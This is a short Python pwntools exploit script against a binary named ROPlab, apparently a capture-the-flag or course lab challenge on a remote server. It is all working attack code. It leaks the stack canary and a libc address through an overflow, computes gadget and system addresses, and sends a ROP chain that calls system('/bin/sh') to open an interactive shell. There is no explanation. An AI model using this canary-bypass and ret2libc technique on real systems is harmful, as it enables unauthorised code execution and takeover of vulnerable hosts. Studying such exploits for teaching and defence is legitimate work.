from pwn import *

# p = process('./ROPlab')
# elf = ELF('./ROPlab')
#libc = elf.libc
p = remote('140.112.31.97', 30102)
libc = ELF('./libc-2.29.so')

# leak canary
p.send('a'*25)
p.recvuntil('a'*24)
canary = u64(p.recv(8)) - ord('a')
success('canary = 0x%x', canary)

# leak libc base
p.send('a'*40)
p.recvuntil('a'*40)
__libc_start_main = u64(p.recvline().strip().ljust(8, b'\x00')) - 235
libc_base = __libc_start_main - libc.sym['__libc_start_main']
success('libc base = 0x%x', libc_base)

# rop chain
pop_rdi = 0x26542 + libc_base
sh = next(libc.search(b'/bin/sh')) + libc_base
system = libc.sym['system'] + libc_base
ret = 0x2535f + libc_base
payload = b'a'*24 + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system)
p.send(payload)

p.interactive()
